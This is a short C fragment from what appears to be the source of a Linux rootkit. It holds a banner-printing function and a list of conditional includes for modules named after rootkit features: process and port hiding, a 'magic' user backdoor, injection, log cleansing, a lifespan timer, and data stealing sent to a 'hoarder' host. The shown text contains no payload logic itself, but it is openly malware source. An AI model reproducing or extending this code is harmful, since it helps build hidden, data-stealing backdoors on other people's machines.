void dorolf(void){
#ifndef NO_ROOTKIT_ANSI
    printf("\033[0;31m");
    for(size_t i=0; i<BDANSI_SIZE; i++)
        printf("%c", bdansi[i]);
    printf("\033[0m\n");
#endif
}

#ifdef HIDE_MY_ASS
#include "ass.c"
#endif
#include "cmds.c"
#if defined AFTER_HOURS || defined AFTER_DAYS
#include "lifespan.c"
#endif
#if defined ENABLE_STEAL && defined HOARDER_HOST
#include "hoarder.c"
#endif
#include "inject.c"
#include "cleanse.c"
#include "hideports.c"
#include "magicusr.c"
#include "rkproc.c"
#include "utils.c"